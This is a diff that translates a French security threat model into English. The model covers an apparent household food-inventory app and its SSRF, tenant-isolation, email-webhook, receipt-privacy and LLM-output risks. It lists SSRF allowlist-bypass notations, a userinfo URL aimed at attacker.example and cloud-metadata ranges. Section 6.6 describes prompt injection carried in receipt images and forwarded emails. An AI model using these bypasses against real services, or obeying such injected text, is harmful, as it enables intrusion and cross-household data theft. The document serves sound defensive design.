-| **DNS rebinding** | L'allowlist passe à la validation, l'appel touche `169.254.169.254` ou `127.0.0.1` | « Résolution DNS effectuée à la validation **et** avant l'appel » | **Le contrôle décrit ne ferme pas la fenêtre.** Résoudre deux fois laisse un TOCTOU : le client HTTP re-résout au moment de la connexion. Le seul contrôle qui tient est **résoudre puis se connecter à l'IP obtenue**, en portant le nom d'origine dans l'en-tête `Host` (et en revalidant l'IP après chaque résolution). Ce n'est écrit nulle part. |
-| Notations alternatives d'adresses | Contournement d'une allowlist naïve | — | **Non traité.** `0x7f000001`, `2130706433`, `127.1`, `0.0.0.0`, `[::1]`, `[::ffff:127.0.0.1]`, `localhost.` (point final), `127.0.0.1.nip.io`. Toute comparaison de chaînes sur l'hôte est contournable ; la comparaison doit porter sur **l'IP résolue et normalisée**, pas sur le texte. |
-| **Port arbitraire sur un hôte autorisé** | Scanner de ports interne : `ollama:22`, `ollama:5432`, `ollama:6379` — les temps de réponse suffisent à cartographier | `CHAUDRON_OLLAMA_ALLOWED_HOSTS` accepte « hostnames **ou** host:port » | **Non couvert si le port est optionnel.** Un hôte autorisé sans port autorise tous ses ports. Le port doit être **obligatoire** dans l'allowlist, et une entrée sans port doit signifier « port 11434 uniquement », jamais « tous ». |
-| `userinfo` dans l'URL | `http://ollama@attaquant.example/` lu comme autorisé par un parseur naïf | — | **Non traité.** L'URL doit être rejetée si elle contient `@`, un caractère de contrôle, ou une séquence encodée dans la partie hôte. |
-| Redirections | Un hôte autorisé redirige vers un hôte interne | Redirections désactivées | — (contrôle correct et suffisant, à condition qu'il soit vraiment posé sur le client HTTP : `httpx` suit `follow_redirects=False` par défaut, mais un `AsyncClient` partagé mal configuré l'active) |
-| Métadonnées cloud | Vol de credentials IAM de l'hébergeur | Implicitement couvert par l'allowlist | Couvert **tant que l'opérateur n'élargit pas l'allowlist**. Il n'existe aucune **denylist plancher** : `169.254.0.0/16`, `::ffff:169.254.0.0/112`, `fd00:ec2::254` doivent être refusés **même si l'opérateur les autorise**. Une allowlist sans plancher fait porter la sécurité à la configuration. |
-| Temps et taille de réponse | Épuisement de connexions, saturation mémoire | Délai d'attente et taille de réponse bornés (`CHAUDRON_OLLAMA_TIMEOUT_SECONDS`) | La **taille** n'a pas de variable de configuration ; seul le temps en a une. Il manque aussi une borne sur la profondeur/taille du JSON désérialisé, et un plafond de concurrence par foyer. |
-| Sondage de capacités à l'enregistrement | Même primitive, déclenchée par un simple POST | « Cet appel passe par la même validation SSRF que les appels d'inférence » | Contrôle correct. À vérifier en test : c'est le chemin qu'on oublie, parce qu'il est écrit avant le client d'inférence. |
+| URL toward an arbitrary host | The server becomes a proxy | Explicit allowlist via environment variable; scheme restricted to `http`/`https`; outside the allowlist ⇒ rejection at registration with an explicit message | — |
+| **DNS rebinding** | The allowlist passes at validation, the call hits `169.254.169.254` or `127.0.0.1` | "DNS resolution performed at validation **and** before the call" | **The described control does not close the window.** Resolving twice leaves a TOCTOU: the HTTP client re-resolves at connection time. The only control that holds is **resolve then connect to the resulting IP**, carrying the original name in the `Host` header (and revalidating the IP after every resolution). This is written nowhere. |
+| Alternative address notations | Bypassing a naive allowlist | — | **Not handled.** `0x7f000001`, `2130706433`, `127.1`, `0.0.0.0`, `[::1]`, `[::ffff:127.0.0.1]`, `localhost.` (trailing dot), `127.0.0.1.nip.io`. Any string comparison on the host is bypassable; the comparison must be on **the resolved and normalised IP**, not on the text. |
+| **Arbitrary port on an allowed host** | Internal port scanner: `ollama:22`, `ollama:5432`, `ollama:6379` — response times alone are enough to map | `CHAUDRON_OLLAMA_ALLOWED_HOSTS` accepts "hostnames **or** host:port" | **Not covered if the port is optional.** An allowed host without a port allows all of its ports. The port must be **mandatory** in the allowlist, and an entry without a port must mean "port 11434 only", never "all". |
+| `userinfo` in the URL | `http://ollama@attacker.example/` read as allowed by a naive parser | — | **Not handled.** The URL must be rejected if it contains `@`, a control character, or an encoded sequence in the host part. |
+| Redirects | An allowed host redirects to an internal host | Redirects disabled | — (correct and sufficient control, provided it is actually set on the HTTP client: `httpx` follows `follow_redirects=False` by default, but a badly configured shared `AsyncClient` enables it) |
+| Cloud metadata | Theft of the hosting provider's IAM credentials | Implicitly covered by the allowlist | Covered **as long as the operator does not widen the allowlist**. There is no **floor denylist**: `169.254.0.0/16`, `::ffff:169.254.0.0/112`, `fd00:ec2::254` must be refused **even if the operator allows them**. An allowlist with no floor makes security rest on configuration. |
+| Response time and size | Connection exhaustion, memory saturation | Bounded timeout and response size (`CHAUDRON_OLLAMA_TIMEOUT_SECONDS`) | **Size** has no configuration variable; only time has one. Also missing: a bound on the depth/size of the deserialised JSON, and a per-household concurrency cap. |
+| Capability probing at registration | Same primitive, triggered by a simple POST | "This call goes through the same SSRF validation as inference calls" | Correct control. To be verified in tests: this is the path people forget, because it is written before the inference client. |
 
-**Conséquence pour la v1 :** l'allowlist doit être un objet, pas une chaîne. Une
-fonction unique `resolve_and_validate(url) -> (ip, port, host_header)` traversée
-par **tous** les appels sortants vers un hôte fourni par l'utilisateur, avec des
-tests contenant explicitement chaque notation ci-dessus.
+**Consequence for v1:** the allowlist must be an object, not a string. A single
+function `resolve_and_validate(url) -> (ip, port, host_header)` traversed by
+**all** outbound calls toward a user-supplied host, with tests explicitly
+containing each of the notations above.
 
 ---
 
-### 6.3 S3 — Isolation entre foyers
+### 6.3 S3 — Tenant isolation between households
 
-**Actifs :** A1, A3, A4, A9. **Attaquant :** P1 — le plus probable.
+**Assets:** A1, A3, A4, A9. **Attacker:** P1 — the most likely one.
 
-C'est la surface la plus grave et la plus probable de ce produit. Un produit
-multi-foyer qui fuit entre foyers n'a plus rien à défendre : A3 et A4 partent
-ensemble.
+This is the most severe and most likely surface of this product. A
+multi-household product that leaks between households has nothing left to
+defend: A3 and A4 go together.
 
-Le dispositif prévu a **trois couches**, et elles n'ont pas la même solidité.
+The planned setup has **three layers**, and they are not equally solid.
 
-| Couche | Ce qu'elle empêche vraiment | Ce qu'elle n'empêche pas |
+| Layer | What it really prevents | What it does not prevent |
 |---|---|---|
-| **Convention applicative** (`HouseholdScope`, repository de base, `household_id` en paramètre obligatoire typé) | Les erreurs d'inattention dans le chemin nominal ; `mypy` attrape l'oubli du paramètre | **Rien** dès que quelqu'un écrit `session.execute(select(Model))` sans passer par le repository. L'ADR-0006 le reconnaît explicitement. Un paramètre obligatoire garantit qu'on *passe* un `household_id`, pas qu'on l'utilise dans le `WHERE`. |
-| **FK composites** `(household_id, x_id)` → `parent(household_id, id)` | **Toute écriture** croisée : ranger un lot dans le frigo d'un autre foyer est impossible, même avec un bug, même avec un `UPDATE` manuel. Sur `llm_purpose_binding`, c'est ce qui empêche de dépenser la clé d'un autre foyer | **Toute lecture.** Une FK composite ne filtre rien : un `SELECT` sans `WHERE household_id` renvoie les lignes de tout le monde. Or la fuite qui compte ici est une fuite en lecture. |
-| **RLS PostgreSQL** | Tout, en lecture comme en écriture, quel que soit le code appelant | **Non activé en v1** dans la conception actuelle. |
+| **Application convention** (`HouseholdScope`, base repository, `household_id` as a mandatory typed parameter) | Careless mistakes on the nominal path; `mypy` catches a forgotten parameter | **Nothing** as soon as somebody writes `session.execute(select(Model))` without going through the repository. ADR-0006 acknowledges this explicitly. A mandatory parameter guarantees that a `household_id` is *passed*, not that it is used in the `WHERE`. |
+| **Composite FKs** `(household_id, x_id)` → `parent(household_id, id)` | **Every** cross-household write: putting a lot into another household's fridge is impossible, even with a bug, even with a manual `UPDATE`. On `llm_purpose_binding`, this is what prevents spending another household's key | **Every read.** A composite FK filters nothing: a `SELECT` without `WHERE household_id` returns everybody's rows. And the leak that matters here is a read leak. |
+| **PostgreSQL RLS** | Everything, on read as on write, whatever the calling code | **Not enabled in v1** in the current design. |
 
-**Ce que la conception actuelle laisse découvert :**
+**What the current design leaves uncovered:**
 
-| Menace | Impact concret | Contrôle retenu | Non couvert |
+| Threat | Concrete impact | Control adopted | Not covered |
 |---|---|---|---|
-| `WHERE household_id` oublié sur un agrégat de stock | P1 voit le frigo d'une autre famille | Repository de base + revue + tests d'isolation par ressource (404, jamais 403) | Les tests d'isolation ne couvrent que les ressources **auxquelles quelqu'un a pensé**. Rien n'échoue quand on oublie d'écrire le test — c'est exactement le mode d'échec que l'ADR-0006 reproche à la migration tardive, reproduit un cran plus bas. |
-| Requête « juste pour un tableau de bord » | Fuite transverse silencieuse | Revue de code | Une convention n'est appliquée qu'aux moments où un relecteur est présent. Le projet est maintenu par une personne, qui relit son propre code. |
-| **Jobs de fond** (parsing de tickets, notifications de péremption, réconciliation de stock) | Fuite de A3/A4 hors de tout contexte HTTP | « Ils doivent charger le foyer depuis la ligne traitée, jamais depuis un contexte ambiant » | **Purement conventionnel, et le document lui-même dit que ce sont eux qui fuiront en premier.** L'index `ix_receipt_pending` est **délibérément transverse aux foyers** : le worker lit une file mélangée et doit se rescoper à la main sur chaque ligne. Une seule ligne traitée avec le `household_id` de la précédente suffit. |
-| `product_id` cross-tenant | Référencer le produit **privé** d'un autre foyer ; exposition d'habitudes d'achat nominatives (marques, régimes, produits médicaux) dans l'autocomplétion | Applicatif uniquement : le repository ne résout un produit que dans `household_id IS NULL OR household_id = :current` | **Trou connu et assumé** (data-model §5.2) : `product.household_id` est nullable, donc inutilisable comme cible de FK composite. C'est le seul endroit du schéma où la base ne peut pas aider. |
-| `instance_owner` usurpé | Un foyer tiers fait payer l'exploitant | `uq_household_instance_owner` garantit au plus un foyer propriétaire ; `DEFAULT false` | La règle « seul ce foyer peut créer une configuration en mode `instance_owner` » est **inter-tables**, donc non exprimable en `CHECK`, donc portée par le service seul. De plus, **deux sources de vérité coexistent** : `household.is_instance_owner` (base) et `CHAUDRON_INSTANCE_OWNER_HOUSEHOLD_ID` (environnement). Leur divergence est une autorisation accordée par erreur. |
-| Clé de stockage objet devinable | Lecture d'une image de ticket sans passer par l'API | Clé **préfixée par `household_id`** + URL signée | Le préfixe ne protège pas si le bucket est listable ou si l'URL signée n'expire pas. Voir §6.5. |
+| `WHERE household_id` forgotten on a stock aggregate | P1 sees another family's fridge | Base repository + review + per-resource isolation tests (404, never 403) | Isolation tests only cover the resources **somebody thought of**. Nothing fails when you forget to write the test — which is exactly the failure mode ADR-0006 holds against late migration, reproduced one level down. |
+| A query "just for a dashboard" | Silent cross-household leak | Code review | A convention is only enforced at moments when a reviewer is present. The project is maintained by one person, who reviews their own code. |
+| **Background jobs** (receipt parsing, expiry notifications, stock reconciliation) | Leak of A3/A4 outside any HTTP context | "They must load the household from the row being processed, never from an ambient context" | **Purely conventional, and the document itself says these are the ones that will leak first.** The `ix_receipt_pending` index is **deliberately cross-household**: the worker reads a mixed queue and must re-scope itself by hand on every row. A single row processed with the previous row's `household_id` is enough. |
+| Cross-tenant `product_id` | Referencing another household's **private** product; exposure of identifying purchase habits (brands, diets, medical products) in autocompletion | Application-level only: the repository resolves a product only within `household_id IS NULL OR household_id = :current` | **Known and accepted hole** (data-model §5.2): `product.household_id` is nullable, hence unusable as the target of a composite FK. It is the only place in the schema where the database cannot help. |
+| `instance_owner` usurped | A third-party household makes the operator pay | `uq_household_instance_owner` guarantees at most one owner household; `DEFAULT false` | The rule "only this household may create a configuration in `instance_owner` mode" is **cross-table**, hence not expressible as a `CHECK`, hence carried by the service alone. Furthermore, **two sources of truth coexist**: `household.is_instance_owner` (database) and `CHAUDRON_INSTANCE_OWNER_HOUSEHOLD_ID` (environment). Their divergence is an authorisation granted by mistake. |
+| Guessable object storage key | Reading a receipt image without going through the API | Key **prefixed with `household_id`** + signed URL | The prefix does not protect if the bucket is listable or if the signed URL does not expire. See §6.5. |
 
-#### Recommandation : exiger le RLS dès la v1
+#### Recommendation: require RLS as of v1
 
-**Position : oui, le Row-Level Security PostgreSQL doit être exigé en v1.** La
-discipline conventionnelle ne suffit pas ici, et l'argument qui justifie de la
-différer ne tient pas pour la pile choisie.
+**Position: yes, PostgreSQL row-level security must be required in v1.**
+Conventional discipline is not enough here, and the argument for deferring it
+does not hold for the chosen stack.
 
-*Pourquoi la convention ne suffit pas.* Les FK composites ferment la classe des
-écritures croisées — c'est un vrai gain, obtenu à bas coût. Mais la fuite qui
-détruit ce produit est **une lecture sans filtre**, et aucune des deux premières
-couches ne l'empêche. Restent la revue (un relecteur, qui est l'auteur) et les
-tests d'isolation (écrits par la même personne, pour les ressources auxquelles
-elle a pensé). Ce n'est pas un filet, c'est la même main qui tient les deux bouts.
+*Why the convention is not enough.* Composite FKs close the class of cross-household
+writes — a real gain, obtained cheaply. But the leak that destroys this product
+is **an unfiltered read**, and neither of the first two layers prevents it. What
+remains is review (one reviewer, who is the author) and isolation tests (written
+by the same person, for the resources she thought of). That is not a safety net,
+it is the same hand holding both ends.
 
-*Pourquoi l'argument de report ne tient pas.* Le report est motivé par le
-pooling : `SET LOCAL` imposerait un pooling en mode transaction, et se tromper
-produirait une fuite inverse — une connexion recyclée qui garde le foyer
-précédent. Le raisonnement est juste **en présence d'un pooler externe**
-(PgBouncer en mode session ou statement). Or la pile retenue est SQLAlchemy 2.x
-asynchrone + `asyncpg`, avec un pool **en processus** qui réserve une connexion
-pour la durée d'une transaction, et `SET LOCAL` est réinitialisé par PostgreSQL
-lui-même au `COMMIT`/`ROLLBACK`. Le mode d'échec redouté suppose soit un `SET`
-de session au lieu d'un `SET LOCAL`, soit un composant que Chaudron n'a pas
-choisi. **Le coût invoqué est celui d'une architecture qui n'est pas la
-sienne.**
+*Why the deferral argument does not hold.* The deferral is motivated by pooling:
+`SET LOCAL` would require transaction-mode pooling, and getting it wrong would
+produce an inverted leak — a recycled connection that keeps the previous
+household. The reasoning is correct **in the presence of an external pooler**
+(PgBouncer in session or statement mode). But the chosen stack is asynchronous
+SQLAlchemy 2.x + `asyncpg`, with an **in-process** pool that reserves a
+connection for the duration of a transaction, and `SET LOCAL` is reset by
+PostgreSQL itself at `COMMIT`/`ROLLBACK`. The feared failure mode assumes either a
+session `SET` instead of a `SET LOCAL`, or a component that Chaudron has not
+chosen. **The cost invoked is that of an architecture which is not its own.**
 
-*Ce qu'il reste vraiment à payer.* Une discipline « une requête HTTP = une
-transaction ». Elle est **déjà** listée comme prérequis à payer immédiatement.
-Une fois payée, le delta jusqu'au RLS est une migration.
+*What really remains to be paid.* A "one HTTP request = one transaction"
+discipline. It is **already** listed as a prerequisite to be paid immediately.
+Once paid, the delta to RLS is one migration.
 
-*Ce que le RLS apporte que rien d'autre n'apporte.* Il déplace la garantie de la
-convention vers le moteur, et il couvre le seul endroit où il n'y a **aucun
-relecteur à l'exécution** : les jobs de fond. Une politique refuse la ligne ;
-elle ne compte pas sur le développeur pour s'en souvenir à 23 h.
+*What RLS brings that nothing else brings.* It moves the guarantee from the
+convention to the engine, and it covers the one place where there is **no
+reviewer at runtime**: background jobs. A policy refuses the row; it does not
+count on the developer remembering at 11 p.m.
 
-*Le déclencheur actuel est inutilisable.* « Le jour où un compte est créé par
-une personne extérieure au cercle familial » n'est pas un événement observable
-par la CI ni par un test. Il sera franchi un soir, par commodité, et personne ne
-s'en apercevra. Un déclencheur qui repose sur la mémoire de l'exploitant n'est
-pas un déclencheur.
+*The current trigger is unusable.* "The day an account is created by a person
+outside the family circle" is not an event observable by CI or by a test. It
+will be crossed one evening, out of convenience, and nobody will notice. A
+trigger that rests on the operator's memory is not a trigger.
 
-*Et le coût aujourd'hui est nul.* Il n'y a **aucun code de fonctionnalité**.
-Chaque heure de rétrofit que l'ADR-0006 redoute est une heure qui n'a pas encore
-été dépensée. C'est précisément l'argument de l'ADR-0006 lui-même, appliqué à sa
-propre conclusion.
+*And the cost today is zero.* There is **no feature code**. Every hour of
+retrofit that ADR-0006 dreads is an hour that has not yet been spent. This is
+precisely ADR-0006's own argument, applied to its own conclusion.
 
-**Forme concrète recommandée pour la v1 :**
+**Recommended concrete form for v1:**
 
-1. Rôle applicatif `chaudron_app`, **non propriétaire** des tables, plus
-   `ALTER TABLE … FORCE ROW LEVEL SECURITY` (le propriétaire contourne RLS sans
-   ça).
-2. `SET LOCAL app.household_id = …` émis par un point unique — la fabrique de
-   session — dans la transaction, jamais dispersé dans les services.
-3. Politiques `USING` **et** `WITH CHECK` identiques :
+1. Application role `chaudron_app`, **not the owner** of the tables, plus
+   `ALTER TABLE … FORCE ROW LEVEL SECURITY` (the owner bypasses RLS without
+   it).
+2. `SET LOCAL app.household_id = …` emitted from a single point — the session
+   factory — inside the transaction, never scattered across the services.
+3. Identical `USING` **and** `WITH CHECK` policies:
    `household_id = current_setting('app.household_id', true)::uuid`.
-4. Un rôle `chaudron_worker` distinct pour la file transverse, avec une vue ou une
-   fonction `SECURITY DEFINER` exposant **uniquement** `(id, household_id)` des
-   tickets en attente ; le traitement réel se fait après avoir posé le tenant.
-   L'index `ix_receipt_pending` reste transverse, mais il ne donne plus accès aux
-   données.
-5. **Conserver la couche applicative** : le RLS est une seconde barrière, pas un
-   remplacement. Un filtre applicatif absent donne une requête lente, pas une
-   requête fausse.
-6. **Conserver les tests d'isolation** : ils vérifient désormais que le
-   comportement est bien 404 et non une erreur de politique.
+4. A separate `chaudron_worker` role for the cross-household queue, with a view or
+   a `SECURITY DEFINER` function exposing **only** `(id, household_id)` of pending
+   receipts; the actual processing happens after the tenant has been set.
+   The `ix_receipt_pending` index stays cross-household, but it no longer gives access
+   to the data.
+5. **Keep the application layer**: RLS is a second barrier, not a replacement. A
+   missing application filter gives a slow query, not a wrong query.
+6. **Keep the isolation tests**: they now verify that the behaviour is indeed a
+   404 and not a policy error.
 
-*Ce que le RLS ne couvre toujours pas, et qu'il faut écrire :* le stockage objet
-(§6.5) n'est pas dans PostgreSQL et ne connaît aucune politique ; le trou
-`product_id` reste applicatif ; et un `current_setting` mal posé — donc absent —
-doit faire **échouer** la requête, pas la laisser passer (d'où le rôle non
-propriétaire et `FORCE`).
+*What RLS still does not cover, and which must be written down:* object storage
+(§6.5) is not in PostgreSQL and knows no policy; the `product_id` hole remains
+application-level; and a badly set `current_setting` — hence an absent one — must
+make the query **fail**, not let it through (hence the non-owner role and
+`FORCE`).
 
 ---
 
-### 6.4 S4 — Webhook de réception d'emails entrants
+### 6.4 S4 — Inbound email reception webhook
 
-**Actifs :** A7, A9, A3. **Attaquant :** P2.
+**Assets:** A7, A9, A3. **Attacker:** P2.
 
-C'est le seul endpoint de Chaudron conçu pour être appelé par un inconnu. Sans
-vérification de signature, n'importe qui injecte des achats dans n'importe quel
-foyer — et surtout, injecte du **texte contrôlé par l'attaquant dans le chemin
-qui va vers un modèle** (§6.6).
+This is Chaudron's only endpoint designed to be called by a stranger. Without
+signature verification, anybody injects purchases into any household — and above
+all, injects **attacker-controlled text into the path that leads to a model**
+(§6.6).
 
-**La note de conception correspondante (`docs/technical-notes-ingestion.md`) est
-référencée mais n'existe pas.** C'est, aujourd'hui, la surface sensible la plus
-sous-spécifiée du projet.
+**The corresponding design note (`docs/technical-notes-ingestion.md`) is
+referenced but does not exist.** It is, today, the most under-specified sensitive
+surface of the project.
 
-| Menace | Impact concret | Contrôle retenu | Non couvert |
+| Threat | Concrete impact | Control adopted | Not covered |
 |---|---|---|---|
-| Webhook non signé | Injection d'achats arbitraires dans n'importe quel foyer | Signature vérifiée avec `CHAUDRON_INBOUND_EMAIL_WEBHOOK_KEY` | L'algorithme n'est pas spécifié. Une comparaison avec `==` est vulnérable au timing ; `hmac.compare_digest` est obligatoire. À écrire, pas à supposer. |
-| **Rejeu** | Un webhook légitime capturé est renvoyé N fois | — | **Non traité.** Il faut un horodatage signé, une fenêtre de tolérance courte, et un cache d'identifiants de message déjà vus. La signature seule ne protège pas du rejeu. |
-| Clé unique pour toute l'instance | Sa fuite compromet **tous** les foyers d'un coup | Secret Podman | Pas de rotation possible sans coupure, pas de portée par foyer. Acceptable pour un prestataire unique, à condition que ce soit écrit. |
-| **Devinabilité de l'adresse de destination** | Un tiers qui devine `foyer-dupont@receipts.example.org` injecte dans ce foyer, même sans la clé si un jour un chemin non signé existe | Rattachement du foyer **par l'adresse de destination** | **Non traité, et c'est le point le plus grave de cette surface.** L'adresse est le seul lien entre un email et un foyer : c'est donc, de fait, un **secret d'autorisation**. Si elle dérive du nom du foyer ou d'un compteur, elle est devinable et énumérable. Elle doit être un **jeton aléatoire d'au moins 128 bits** (`r7k2m9x4q1w8@…`), révocable, régénérable, et **aucune colonne du modèle de données ne la porte aujourd'hui**. |
-| Énumération des foyers | Cartographie des foyers de l'instance | — | **Non traité.** Le webhook doit répondre **identiquement** (même code, même délai) pour une adresse inconnue et pour une adresse connue. Sinon il devient un oracle d'existence de foyer. |
-| Usurpation de l'expéditeur | Un tiers envoie un faux récapitulatif à l'adresse d'un foyer | — | **Non traité.** Même avec un webhook signé par le prestataire, l'email qu'il relaie peut venir de n'importe qui. Il faut soit une allowlist d'expéditeurs par foyer, soit un statut « non vérifié » visible dans l'écran de revue. Le contrôle de fond reste la revue humaine (§6.6). |
-| Pièces jointes hostiles | Déni de service, traversée de chemin, parsing MIME dangereux | `CHAUDRON_INBOUND_EMAIL_MAX_BYTES` | La borne de taille ne dit rien du **nombre** de pièces jointes, des archives imbriquées, ni du nom de fichier. **Le nom de fichier fourni ne doit jamais servir à construire un chemin** : la clé de stockage est dérivée de `(household_id, uuid)`, jamais du nom reçu. Le type MIME doit être déterminé par inspection du contenu, pas par l'en-tête. |
-| Bombe de décompression / image | Épuisement mémoire du worker | — | **Non traité.** Les dimensions de l'image doivent être bornées avant décodage, pas après. |
+| Unsigned webhook | Injection of arbitrary purchases into any household | Signature verified with `CHAUDRON_INBOUND_EMAIL_WEBHOOK_KEY` | The algorithm is not specified. A comparison with `==` is vulnerable to timing; `hmac.compare_digest` is mandatory. To be written, not assumed. |
+| **Replay** | A captured legitimate webhook is resent N times | — | **Not handled.** A signed timestamp, a short tolerance window, and a cache of already-seen message identifiers are required. The signature alone does not protect against replay. |
+| Single key for the whole instance | Its leak compromises **every** household at once | Podman secret | No rotation possible without downtime, no per-household scope. Acceptable for a single provider, provided it is written down. |
+| **Guessability of the destination address** | A third party who guesses `foyer-dupont@receipts.example.org` injects into that household, even without the key if an unsigned path ever exists | Household attachment **by destination address** | **Not handled, and this is the most severe point of this surface.** The address is the only link between an email and a household: it is therefore, in effect, an **authorisation secret**. If it derives from the household name or from a counter, it is guessable and enumerable. It must be a **random token of at least 128 bits** (`r7k2m9x4q1w8@…`), revocable, regenerable, and **no column of the data model carries it today**. |
+| Household enumeration | Mapping the instance's households | — | **Not handled.** The webhook must respond **identically** (same code, same delay) for an unknown address and for a known one. Otherwise it becomes an oracle for household existence. |
+| Sender spoofing | A third party sends a fake summary to a household's address | — | **Not handled.** Even with a webhook signed by the provider, the email it relays can come from anybody. Either a per-household sender allowlist is required, or an "unverified" status visible in the review screen. The underlying control remains human review (§6.6). |
+| Hostile attachments | Denial of service, path traversal, dangerous MIME parsing | `CHAUDRON_INBOUND_EMAIL_MAX_BYTES` | The size bound says nothing about the **number** of attachments, nested archives, or the file name. **The supplied file name must never be used to build a path**: the storage key is derived from `(household_id, uuid)`, never from the received name. The MIME type must be determined by inspecting the content, not from the header. |
+| Decompression / image bomb | Memory exhaustion of the worker | — | **Not handled.** Image dimensions must be bounded before decoding, not after. |
 
 ---
 
-### 6.5 S5 — Images de tickets et données personnelles
+### 6.5 S5 — Receipt images and personal data
 
-**Actifs :** A3, A4. **Attaquants :** P1, P2, P3.
+**Assets:** A3, A4. **Attackers:** P1, P2, P3.
 
-| Menace | Impact concret | Contrôle retenu | Non couvert |
+| Threat | Concrete impact | Control adopted | Not covered |
 |---|---|---|---|
-| Accès inter-foyer à une image | Lecture de A4 par P1 | Clé d'objet **préfixée par `household_id`** ; service par URL signée ; ligne `receipt` filtrée par tenant | Le préfixe empêche la **devinette**, pas l'**énumération** si le bucket est listable. La durée de validité de l'URL signée n'est pas définie ; une URL longue durée transmise dans un `Referer` ou un historique de navigateur est une fuite persistante. |
-| Accès non authentifié | Lecture de A4 par P2 | Idem | Une image servie directement par le reverse proxy depuis un répertoire, sans passer par l'API, court-circuite tout. Le volume `%h/chaudron/data/uploads` est un répertoire de fichiers : rien n'empêche de le publier par erreur. |
-| **Rétention** | Une photo de ticket vit indéfiniment | — | **Non tranché** (data-model §11 q5). L'architecture recommande « purge après traitement à privilégier », le modèle de données ne porte **aucune colonne** pour la suivre. Sans colonne, il n'y a pas de purge : il y a une intention. |
-| Contenu résiduel après suppression | L'image reste alors que la ligne est partie | `ON DELETE CASCADE` depuis `household` | **Le CASCADE ne touche que PostgreSQL.** Supprimer un foyer efface les lignes et laisse les objets. Une suppression RGPD partielle est une non-conformité qui a l'air d'une conformité. |
-| **EXIF** | Géolocalisation du domicile republiée avec l'image | — | **Non traité.** Les métadonnées EXIF (GPS, modèle d'appareil, horodatage) doivent être supprimées **à l'ingestion**, avant écriture. |
-| Type de contenu au service | XSS stocké si une image est servie en `text/html` | — | **Non traité.** `Content-Type` déterminé par inspection, `Content-Disposition: attachment` ou domaine séparé, `X-Content-Type-Options: nosniff`. |
-| Données bancaires partielles | Fragments de PAN, carte de fidélité | Revue humaine | Ces fragments **restent dans l'image** et dans `receipt.raw_response`. On ne les enlève pas ; on limite leur durée de vie (§8). |
-| `stock_snapshot` | Inventaire complet d'un domicile, en JSONB, indéfiniment | — | **Non tranché.** C'est, de l'aveu du modèle de données, « la donnée la plus sensible de la base ». Elle n'a ni durée de vie, ni chiffrement applicatif, ni motif de conservation borné. |
-| Transmission au modèle | A3/A4 partent chez un tiers | BYOK : le foyer choisit son fournisseur, et donc sa juridiction (Mistral UE, ou Ollama et rien ne sort) | Le **choix** est offert ; le **consentement éclairé** ne l'est pas encore. L'utilisateur doit voir, avant l'envoi, quoi part et vers qui. Voir §8. |
+| Cross-household access to an image | Reading of A4 by P1 | Object key **prefixed with `household_id`**; served by signed URL; `receipt` row filtered by tenant | The prefix prevents **guessing**, not **enumeration** if the bucket is listable. The validity period of the signed URL is not defined; a long-lived URL passed in a `Referer` or a browser history is a persistent leak. |
+| Unauthenticated access | Reading of A4 by P2 | Same | An image served directly by the reverse proxy from a directory, without going through the API, short-circuits everything. The volume `%h/chaudron/data/uploads` is a directory of files: nothing prevents publishing it by mistake. |
+| **Retention** | A receipt photo lives indefinitely | — | **Not settled** (data-model §11 q5). The architecture recommends "purge after processing to be preferred", the data model carries **no column** to track it. Without a column there is no purge: there is an intention. |
+| Residual content after deletion | The image remains while the row is gone | `ON DELETE CASCADE` from `household` | **The CASCADE only touches PostgreSQL.** Deleting a household erases the rows and leaves the objects. A partial GDPR erasure is a non-compliance that looks like compliance. |
+| **EXIF** | The home's geolocation republished along with the image | — | **Not handled.** EXIF metadata (GPS, device model, timestamp) must be stripped **at ingestion**, before writing. |
+| Content type when serving | Stored XSS if an image is served as `text/html` | — | **Not handled.** `Content-Type` determined by inspection, `Content-Disposition: attachment` or a separate domain, `X-Content-Type-Options: nosniff`. |
+| Partial banking data | PAN fragments, loyalty card | Human review | These fragments **stay in the image** and in `receipt.raw_response`. We do not remove them; we limit their lifetime (§8). |
+| `stock_snapshot` | A home's complete inventory, in JSONB, indefinitely | — | **Not settled.** It is, by the data model's own admission, "the most sensitive data in the database". It has neither a lifetime, nor application-level encryption, nor a bounded retention purpose. |
+| Transmission to the model | A3/A4 leave for a third party | BYOK: the household chooses its provider, and therefore its jurisdiction (Mistral EU, or Ollama and nothing leaves). **Consent enforced since revision `0016`**: a configuration with no agreement on record is refused before its credential is decrypted, `ollama` excepted. | The **gate** exists; the **screen** does not. Consent can be recorded and is enforced, but no route grants or withdraws it, because no route creates a provider configuration at all — so today the only way to agree is a manual `UPDATE`. "The user must see, before sending, what leaves and to whom" therefore remains unmet. See §8 and §12. |
 
 ---
 
-### 6.6 S6 — La sortie de modèle est une entrée non fiable
+### 6.6 S6 — Model output is untrusted input
 
-**Actifs :** A9 (intégrité), et indirectement A3. **Attaquants :** P1, P2 via un
-contenu qu'ils contrôlent.
+**Assets:** A9 (integrity), and indirectly A3. **Attackers:** P1, P2 via content
+they control.
 
-Le principe est déjà posé — *« un JSON produit par un LLM passe par la même
-validation qu'un formulaire posté par un inconnu »*. Ce qui manque, c'est la
-prise en compte du fait que **le contenu injecté n'est pas produit par le
-modèle : il est transporté par lui**.
+The principle is already stated — *"JSON produced by an LLM goes through the same
+validation as a form posted by a stranger"*. What is missing is taking account of
+the fact that **the injected content is not produced by the model: it is carried
+by it**.
 
-Deux vecteurs d'entrée que Chaudron accepte par conception :
+Two input vectors that Chaudron accepts by design:
 
-- **L'image d'un ticket**, qui peut porter du texte imprimé par un attaquant
-  (une étiquette collée, un faux ticket photographié) ;
-- **Le corps d'un email transféré**, entièrement contrôlé par l'expéditeur.
+- **The image of a receipt**, which can carry text printed by an attacker (a
+  stuck-on label, a fake receipt photographed);
+- **The body of a forwarded email**, entirely controlled by the sender.
 
-| Menace | Impact concret | Contrôle retenu | Non couvert |
+| Threat | Concrete impact | Control adopted | Not covered |
 |---|---|---|---|
-| Injection de prompt via un ticket ou un email | Le modèle produit des lignes inventées, ou ignore ses instructions | Schéma de sortie strict + **revue humaine obligatoire avant écriture en stock** | La revue humaine est le contrôle réel, et il est bon. Mais elle protège l'**écriture**, pas l'**affichage** : le texte injecté est affiché à l'utilisateur avant qu'il ne décide. |
-| Sortie contenant du HTML/JS | XSS stocké dans l'écran de revue ou la recette | Validation Pydantic | La validation vérifie la **forme**, pas l'innocuité du contenu. Le front doit rendre tout champ issu d'un modèle en **texte pur**, jamais en HTML, jamais en Markdown avec liens actifs. Une CSP stricte, sans `unsafe-inline`, est le second filet. |
